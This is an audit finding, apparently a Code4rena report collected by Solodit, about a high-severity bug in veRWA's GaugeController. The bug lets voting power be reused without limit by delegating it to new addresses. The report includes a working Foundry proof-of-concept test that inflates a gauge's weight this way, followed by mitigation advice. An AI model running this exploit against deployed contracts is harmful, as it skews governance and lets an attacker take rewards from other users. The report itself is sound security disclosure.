---
# Core Classification
protocol: Canto
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 26970
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-08-verwa
source_link: https://code4rena.com/reports/2023-08-verwa
github_link: https://github.com/code-423n4/2023-08-verwa-findings/issues/396

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - yield
  - services
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 21
finders:
  - popular00
  - kaden
  - ltyu
  - SpicyMeatball
  - deadrxsezzz
---

## Vulnerability Title

[H-02] Voters from VotingEscrow can vote infinite times in vote_for_gauge_weights() of GaugeController

### Overview


This bug report is about a vulnerability in the `GaugeController` and `VotingEscrow` contracts of veRWA. This vulnerability allows users to vote multiple times on the weight of a specific gauge. This could be exploited by claiming more tokens in the `LendingLedger` in the market that they have inflated the votes on.

A proof-of-concept (PoC) was built in Foundry, which showed that due to the delegate mechanism in `VotingEscrow`, a user can vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.

The vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the recommended mitigation steps are:

- The voting power should be fetched from n blocks in the past.
- A predefined window by the governance should be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.

This bug report was chosen as best due to the clear and concise explanation, including business impact on the protocol, and including an executable PoC.

### Original Finding Content


<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L211> <br><https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L356>

Delegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.

### Proof of Concept

`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user.
The `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.

Due to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.

A POC was built in Foundry, add the following test to `GaugeController.t.sol`:

<details>

```solidity
function testDelegateSystemMultipleVoting() public {
    vm.deal(user1, 100 ether);
    vm.startPrank(gov);
    gc.add_gauge(user1);
    gc.change_gauge_weight(user1, 100);
    vm.stopPrank();

    vm.deal(user2, 100 ether);
    vm.startPrank(gov);
    gc.add_gauge(user2);
    gc.change_gauge_weight(user2, 100);
    vm.stopPrank();

    uint256 v = 10 ether;

    vm.startPrank(user1);
    ve.createLock{value: v}(v);
    gc.vote_for_gauge_weights(user1, 10_000);
    vm.stopPrank();

    vm.startPrank(user2);
    ve.createLock{value: v}(v);
    gc.vote_for_gauge_weights(user2, 10_000);
    vm.stopPrank();

    uint256 expectedWeight_ = gc.get_gauge_weight(user1);

    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);

    uint256 numDelegatedTimes_ = 20;

    for (uint i_; i_ < numDelegatedTimes_; i_++) {
        address fakeUserI_ = vm.addr(i_ + 27); // random num
        vm.deal(fakeUserI_, 1);

        vm.prank(fakeUserI_);
        ve.createLock{value: 1}(1);

        vm.prank(user1);
        ve.delegate(fakeUserI_);

        vm.prank(fakeUserI_);
        gc.vote_for_gauge_weights(user1, 10_000);
    }

    // assert that the weight is approx numDelegatedTimes_ more than expected
    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);

    // relative weight has been increase by a lot, can be increased even more if wished
    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);
}
```

</details>


### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

The vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past.

Additionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/396#issuecomment-1693179514):**
 > Chosen as best due to the clear and concise explanation, including business impact on the protocol, and including an executable PoC.

 **[OpenCoreCH (veRWA) confirmed on duplicate finding 86](https://github.com/code-423n4/2023-08-verwa-findings/issues/86)**

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Canto |
| Report Date | N/A |
| Finders | popular00, kaden, ltyu, SpicyMeatball, deadrxsezzz, GREY-HAWK-REACH, immeas, Yanchuan, 0xComfyCat, 0xDetermination, th13vn, Tricko, 0x73696d616f, nonseodion, oakcobalt, 1, 2, QiuhaoLi, mert\_eren, lanrebayode77, Team\_Rocket |

### Source Links

- **Source**: https://code4rena.com/reports/2023-08-verwa
- **GitHub**: https://github.com/code-423n4/2023-08-verwa-findings/issues/396
- **Contest**: https://code4rena.com/reports/2023-08-verwa

### Keywords for Search

`vulnerability`

